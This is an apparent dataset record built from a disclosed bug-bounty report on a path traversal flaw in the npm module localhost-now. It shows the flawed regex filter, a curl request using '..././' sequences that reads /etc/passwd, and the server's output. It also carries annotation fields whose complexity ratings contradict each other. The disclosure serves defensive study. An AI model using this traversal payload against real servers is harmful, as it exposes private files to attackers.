{
  "reported_to": "Node.js third-party modules",
  "reported_by": "dienpv ",
  "title": "[localhost-now] bypassing url filter which leads to read content of arbitrary file",
  "content": "\nHi guys,\ni can bypass url filter in localhost-now module.\nIt allows to read content of arbitrary files on the remote server.\nModule\nmodule name: localhost-now\nversion: 1.0.2\nnpm page: https://www.npmjs.com/package/localhost-now\nModule Stats\n26 downloads in the last week\nVulnerability Description\nLack of file path sanitization by using the regex method causes that any file on the server might be read by malicious user\nex: input: url = ..././etc/passwd\nwhen the url calls replace(/(..[\\/\\])+/g, '') and then ../ will be removed -> final result: url = ../etc/passwd. (same in windows for ...\\.\\)\nCode 115 Bytes\n1// /localhost-now/lib/app.js, line 17:\n2const file = url === '/' ? '/index.html' : url.replace(/(\\.\\.[\\/\\\\])+/g, '')\nSteps To Reproduce:\ninstall localhost-now: npm install localhost-now\nrun localhost-now in your directory\nCode 96 Bytes\n1root@kali:/var/www/html/localhost-now/bin# nodejs localhost\n2Web Server started on localhost:1337\nexecute following curl command (adjust number of ../ to reflect your system):\ncurl -v --path-as-is http://127.0.0.1:1337/..././..././..././..././..././etc/passwd\nlook at result:\nCode 844 Bytes\n1* Trying 127.0.0.1...\n2* Connected to 127.0.0.1 (127.0.0.1) port 1337 (#0)\n3> GET /..././..././..././..././..././etc/passwd HTTP/1.1\n4> Host: 127.0.0.1:1337\n5> User-Agent: curl/7.50.1\n6> Accept: */*\n7> \n8< HTTP/1.1 200 OK\n9< content-type: text/\n10< Date: Mon, 09 Apr 2018 09:04:13 GMT\n11< Connection: keep-alive\n12< Content-Length: 2908\n13< \n14root:x:0:0:root:/root:/bin/bash\n15daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n16bin:x:2:2:bin:/bin:/usr/sbin/nologin\n17sys:x:3:3:sys:/dev:/usr/sbin/nologin\n18sync:x:4:65534:sync:/bin:/bin/sync\n19games:x:5:60:games:/usr/games:/usr/sbin/nologin\n20man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n21lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n22mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n23news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n24uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n25proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nthanks you\nImpact\nThis vulnerability might be used to read content of any file on the server\n\n",
  "severity": [
    7.5,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "Path Traversal"
  ],
  "screenshots": {},
  "disclosed_date": 1527699900,
  "report_url": "https://hackerone.com/reports/334837",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "HIGH",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Install localhost-now: npm install localhost-now"
    ],
    [
      2,
      "Run localhost-now in your directory and execute curl command with path traversal: curl -v --path-as-is http://127.0.0.1:1337/..././..././..././..././..././etc/passwd"
    ]
  ],
  "vuln_description": "The vulnerability involves bypassing a URL filter in the localhost-now module due to insufficient file path sanitization, allowing an attacker to read arbitrary files on the server by manipulating the URL with path traversal sequences.",
  "reason": "The attack is straightforward, involving a single component (URL manipulation) and a well-known vulnerability pattern (path traversal). The interaction is obvious, and the attack does not require complex state manipulation or novel logic.",
  "new_complexity": "LOW",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}